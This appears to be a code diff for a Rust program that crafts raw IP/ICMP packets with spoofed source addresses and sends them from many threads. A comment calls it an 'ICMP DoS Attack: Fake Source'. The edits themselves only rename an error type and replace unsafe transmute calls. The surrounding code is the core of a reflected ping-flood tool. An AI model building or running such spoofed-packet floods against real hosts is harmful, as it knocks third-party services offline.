@@ -3,7 +3,7 @@
 
 use std::{
     error::Error,
-    mem::{size_of, transmute},
+    mem::size_of,
     net::Ipv4Addr,
     str::FromStr, thread::{ self, JoinHandle },
 };
@@ -15,7 +15,7 @@ use netlib::{
     aux::{htons, random, HostOrIPv4, htonl, ntohl},
     bincode_options,
     data::SockAddrIn,
-    error::NetError,
+    error::NetErr,
     network::{
         icmp::{ICMPType, ICMP},
         ip::{Protocol, IP}, inet_cksum,
@@ -26,7 +26,7 @@ const PACKAGE_SIZE: usize = size_of::<IP>() + size_of::<ICMP>() + 64;
 static mut RAWSOCK: i32 = 0;
 
 
-pub unsafe fn quick_ping_once(ip_src: u32, mut dst: sockaddr_in) -> Result<(), NetError> {
+pub unsafe fn quick_ping_once(ip_src: u32, mut dst: sockaddr_in) -> Result<(), NetErr> {
     let mut sendbuf = [0u8; PACKAGE_SIZE];
     let config = bincode_options!();
 
@@ -45,7 +45,7 @@ pub unsafe fn quick_ping_once(ip_src: u32, mut dst: sockaddr_in) -> Result<(), N
     };
     config
     .serialize_into(&mut sendbuf[..size_of::<IP>()], &iphdr)
-    .or(Err(NetError::SerializeFailed))?;
+    .or(Err(NetErr::SerializeFailed))?;
 
     iphdr.checksum = inet_cksum(sendbuf.as_ptr(), size_of::<IP>());
 
@@ -60,10 +60,10 @@ pub unsafe fn quick_ping_once(ip_src: u32, mut dst: sockaddr_in) -> Result<(), N
 
     config
     .serialize_into(&mut sendbuf[..size_of::<IP>()], &iphdr)
-    .or(Err(NetError::SerializeFailed))?;
+    .or(Err(NetErr::SerializeFailed))?;
     config
     .serialize_into(&mut sendbuf[size_of::<IP>()..], &icmphdr)
-    .or(Err(NetError::SerializeFailed))?;
+    .or(Err(NetErr::SerializeFailed))?;
 
     let size = sendto(
         RAWSOCK,
@@ -82,7 +82,7 @@ pub unsafe fn quick_ping_once(ip_src: u32, mut dst: sockaddr_in) -> Result<(), N
         let errno = ErrNo::fetch();
 
         eprintln!("{:#?} sendto {:#?} failed({errno:#?})", src, dst);
-        return Err(NetError::SendToFailed);
+        return Err(NetErr::SendToFailed);
     }
     else {
         println!("{:#?} sendto {:#?} succeed", src, dst);
@@ -140,13 +140,12 @@ fn main() -> Result<(), Box<dyn Error>> {
         let hostorip = HostOrIPv4::from_str(&dst)?;
 
         let dst: Ipv4Addr = hostorip.try_into()?;
-        let cdst =
-            transmute::<SockAddrIn, sockaddr_in>(SockAddrIn::from(dst));
+        let cdst: sockaddr_in = SockAddrIn::from(dst).into();
 
         // IPPROTO_RAW - 255
         RAWSOCK = socket(AF_INET, SOCK_RAW, Protocol::Reserved as i32);
         if RAWSOCK < 0 {
-            return Err(box NetError::CreateRawSocketFailed);
+            return Err(box NetErr::CreateRawSocketFailed);
         }
 
         // ICMP DoS Attack: Fake Source
@@ -179,7 +178,7 @@ fn main() -> Result<(), Box<dyn Error>> {
         let threads: Vec<JoinHandle<()>> = ip_pool
         .into_iter()
         .map(move |ipv4| {
-            let refrelct_from = transmute::<SockAddrIn, sockaddr_in>(SockAddrIn::from(ipv4));
+            let refrelct_from = SockAddrIn::from(ipv4).into();
 
             thread::Builder::new()
             .name(format!("dos-child-{:#?}", ipv4))
